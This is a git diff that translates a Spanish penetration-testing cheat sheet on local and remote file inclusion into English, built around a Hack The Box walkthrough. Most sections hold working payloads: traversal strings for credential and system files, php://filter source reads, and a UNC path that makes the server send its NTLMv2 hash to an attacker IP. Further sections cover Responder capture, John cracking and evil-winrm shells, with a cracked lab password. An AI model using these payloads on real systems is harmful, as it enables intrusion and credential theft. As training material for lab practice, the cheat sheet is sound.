@@ -2,15 +2,15 @@
 tags: [web, lfi]
 ---
 
-> **Local File Inclusion (LFI)** y **Remote File Inclusion (RFI)** son vulnerabilidades web que permiten incluir archivos del sistema de archivos del servidor (LFI) o de URLs remotas (RFI) manipulando input del usuario. Esta guía se enfoca en lo que hemos practicado: path traversal básico y la cadena LFI → Responder → NTLMv2 → WinRM.
+> **Local File Inclusion (LFI)** and **Remote File Inclusion (RFI)** are web vulnerabilities that allow including files from the server's filesystem (LFI) or from remote URLs (RFI) by manipulating user input. This guide focuses on what we've practiced: basic path traversal and the LFI → Responder → NTLMv2 → WinRM chain.
 
 ---
 
-## Quickstart — Test universal
+## Quickstart — Universal test
 
 ```bash
-# Los 3 tests que delatan LFI:
-../../../../etc/passwd           # path traversal clásico (Linux)
+# The 3 tests that reveal LFI:
+../../../../etc/passwd           # classic path traversal (Linux)
 ..\..\..\..\windows\win.ini      # path traversal (Windows)
 php://filter/convert.base64-encode/resource=index.php    # wrapper test
 ```
@@ -19,126 +19,126 @@ php://filter/convert.base64-encode/resource=index.php    # wrapper test
 
 ## LFI to NTLM Hash Capture — The Responder Chain (Windows)
 
-En targets **Windows + PHP**, LFI/RFI se puede encadenar con Responder para capturar hashes NTLMv2 sin tocar el sistema de archivos. Esta es una técnica poderosa cuando `allow_url_include` está Off y log poisoning no es viable.
+On **Windows + PHP** targets, LFI/RFI can be chained with Responder to capture NTLMv2 hashes without touching the filesystem. This is a powerful technique when `allow_url_include` is Off and log poisoning isn't viable.
 
-### La cadena de ataque
+### The attack chain
 
 ```
 LFI/RFI parameter → UNC path → SMB connection to attacker → Responder captures NTLMv2 hash → Crack with John → WinRM shell
 ```
 
-### Paso 1 — Confirmar LFI en un servidor Windows + PHP
+### Step 1 — Confirm LFI on a Windows + PHP server
 
 ```bash
-# Test con path de Windows
+# Test with a Windows path
 http://unika.htb/index.php?page=..\..\..\..\..\..\..\windows\win.ini
 
-# Si el archivo carga → LFI confirmado, y sabemos que es Windows + PHP
+# If the file loads → LFI confirmed, and we know it's Windows + PHP
 ```
 
-### Paso 2 — Disparar autenticación NTLM vía UNC path
+### Step 2 — Trigger NTLM authentication via UNC path
 
-El `include()` de PHP en Windows resuelve rutas UNC (`\\host\share`) vía SMB. Cuando el servidor intenta conectarse a una ruta UNC controlada por el atacante, Windows automáticamente envía el hash NTLMv2 del proceso del servidor como parte del handshake SMB.
+PHP's `include()` on Windows resolves UNC paths (`\\host\share`) via SMB. When the server tries to connect to an attacker-controlled UNC path, Windows automatically sends the server process's NTLMv2 hash as part of the SMB handshake.
 
 ```bash
-# En el parámetro vulnerable, usa una ruta UNC apuntando a tu IP de atacante:
+# In the vulnerable parameter, use a UNC path pointing to your attacker IP:
 http://target.htb/index.php?page=\\10.10.14.5\file
 
-# O URL-encoded (para testear en navegador):
+# Or URL-encoded (for browser testing):
 http://target.htb/index.php?page=%5C%5C10.10.14.5%5Cfile
 ```
 
-### Paso 3 — Capturar el hash con Responder
+### Step 3 — Capture the hash with Responder
 
 ```bash
-# Iniciar Responder en tu interfaz VPN
+# Start Responder on your VPN interface
 $ sudo responder -I tun0
 
-# Cuando el target se conecta, Responder captura:
+# When the target connects, Responder captures:
 [SMB] NTLMv2-SSP Client   : 10.129.12.192
 [SMB] NTLMv2-SSP Username : RESPONDER\Administrator
 [SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:8289f1...00000000
 ```
 
-> 💡 **Por qué funciona:** `include()` de PHP en Windows llama a la Win32 API para abrir archivos. Las rutas UNC (`\\host\share\file`) disparan al cliente SMB para autenticarse al host especificado. Responder se hace pasar por un servidor SMB y captura el challenge-response NTLMv2.
+> 💡 **Why it works:** PHP's `include()` on Windows calls the Win32 API to open files. UNC paths (`\\host\share\file`) trigger the SMB client to authenticate to the specified host. Responder impersonates an SMB server and captures the NTLMv2 challenge-response.
 
-### Paso 4 — Crackear el hash NTLMv2
+### Step 4 — Crack the NTLMv2 hash
 
 ```bash
-# Guardar el hash capturado en un archivo, luego crackear:
+# Save the captured hash to a file, then crack:
 $ john --format=netntlmv2 hash.txt
 ```
 
-### Paso 5 — Obtener shell con las credenciales crackeadas
+### Step 5 — Get a shell with the cracked credentials
 
 ```bash
-# Si WinRM (5985) está abierto:
+# If WinRM (5985) is open:
 $ evil-winrm -i target.htb -u Administrator -p 'cracked_password'
 
-# O con NetExec para ejecución rápida de comandos:
+# Or with NetExec for quick command execution:
 $ netexec winrm target.htb -u Administrator -p 'cracked_password' -x 'whoami'
 ```
 
-### Pre-requisitos para esta técnica
+### Prerequisites for this technique
 
-| Requisito | Cómo verificarlo |
+| Requirement | How to verify |
 | :-------- | :--------------- |
-| Windows OS | nmap `-O` o comprobar si `C:\Windows\win.ini` carga |
-| Servidor PHP | Apache/Nginx con PHP en Windows |
-| Parámetro LFI o RFI | Cualquier parámetro que llame a `include()`, `require()` |
-| SMB outbound (445) | El target debe poder alcanzar tu IP atacante en puerto 445 |
-| Responder ejecutándose | `sudo responder -I tun0` en tu máquina atacante |
+| Windows OS | nmap `-O` or check if `C:\Windows\win.ini` loads |
+| PHP server | Apache/Nginx with PHP on Windows |
+| LFI or RFI parameter | Any parameter that calls `include()`, `require()` |
+| SMB outbound (445) | The target must be able to reach your attacker IP on port 445 |
+| Responder running | `sudo responder -I tun0` on your attacker machine |
 
-### Troubleshooting de la cadena Responder
+### Responder chain troubleshooting
 
-| Problema | Solución |
+| Problem | Solution |
 | :------- | :------- |
-| No se captura hash | Verificar firewall — puerto 445 debe ser alcanzable desde el target |
-| Hash capturado pero no crackea | NTLMv2 puede tomar tiempo — usa reglas o un wordlist más grande |
-| `include()` no resuelve UNC | Algunas configs de PHP deshabilitan rutas UNC — prueba otro parámetro |
-| Responder muestra SMB pero sin hash | El target puede requerir SMB signing — prueba otro método de coerción |
+| No hash captured | Check firewall — port 445 must be reachable from the target |
+| Hash captured but won't crack | NTLMv2 can take time — use rules or a larger wordlist |
+| `include()` doesn't resolve UNC | Some PHP configs disable UNC paths — try another parameter |
+| Responder shows SMB but no hash | The target may require SMB signing — try another coercion method |
 
-### Ejemplo real — HTB Responder
+### Real example — HTB Responder
 
-Esta cadena exacta aparece en la máquina **Responder**:
-1. Descubrir virtual host `unika.htb`
-2. Encontrar parámetro `?page=` que incluye archivos PHP
-3. Testear LFI con `..\..\..\..\windows\win.ini` → confirmado
-4. Disparar RFI con `\\10.10.14.5\file` → Responder captura NTLMv2 de `Administrator`
-5. Crackear con John → password: `badminton`
-6. NetExec WinRM → `(Pwn3d!)` → shell como Administrator
+This exact chain appears in the **Responder** machine:
+1. Discover virtual host `unika.htb`
+2. Find `?page=` parameter that includes PHP files
+3. Test LFI with `..\..\..\..\windows\win.ini` → confirmed
+4. Trigger RFI with `\\10.10.14.5\file` → Responder captures Administrator's NTLMv2
+5. Crack with John → password: `badminton`
+6. NetExec WinRM → `(Pwn3d!)` → shell as Administrator
 
 ---
 
-## LFI Traversal — Lo básico
+## LFI Traversal — The basics
 
-### Path traversal estándar
+### Standard path traversal
 
 ```bash
 # Linux
 ../../../../etc/passwd
 /../../../etc/passwd
-....//....//....//....//etc/passwd    # double traversal (bypassea algunos filtros)
+....//....//....//....//etc/passwd    # double traversal (bypasses some filters)
 
 # Windows
 ..\..\..\..\windows\win.ini
 ..\..\..\..\windows\system32\drivers\etc\hosts
 ```
 
-### Paths absolutos vs relativos
+### Absolute vs relative paths
 
 ```bash
-# Relativo (más común en CTFs)
+# Relative (more common in CTFs)
 http://target.htb/page.php?file=../../../../etc/passwd
 
-# Absoluto
+# Absolute
 http://target.htb/page.php?file=/etc/passwd
 
-# Letra de unidad (Windows)
+# Drive letter (Windows)
 http://target.htb/page.php?file=C:\Windows\win.ini
 ```
 
-### Archivos sensibles por SO
+### Sensitive files by OS
 
 | Linux | Windows |
 | :---- | :------ |
@@ -148,29 +148,29 @@ http://target.htb/page.php?file=C:\Windows\win.ini
 
 ---
 
-## PHP Wrappers — Lo esencial
+## PHP Wrappers — The essentials
 
-### `php://filter` — Leer código fuente como base64
+### `php://filter` — Read source code as base64
 
 ```bash
-# Leer index.php
+# Read index.php
 http://target.htb/page.php?file=php://filter/convert.base64-encode/resource=index.php
 
-# Leer config.php
+# Read config.php
 http://target.htb/page.php?file=php://filter/convert.base64-encode/resource=config.php
 
-# Decodificar localmente
+# Decode locally
 echo "PD9waHAg..." | base64 -d
 ```
 
-> 💡 **Por qué funciona:** `php://filter` convierte el contenido del archivo a base64 *antes* de que `include()` lo procese. Como base64 es texto plano, PHP no intentará ejecutarlo como código.
+> 💡 **Why it works:** `php://filter` converts the file content to base64 *before* `include()` processes it. Since base64 is plain text, PHP won't try to execute it as code.
 
 ---
 
-## Parámetros comunes de LFI para fuzzear
+## Common LFI parameters to fuzz
 
 ```bash
-# Estos parámetros suelen aceptar rutas de archivo:
+# These parameters often accept file paths:
 file, page, include, inc, dir, path, folder, root, doc
 lang, cmd, pg, style, pdf, template, php_path, doc_path
 module, mod, content, site, load, show, read, view
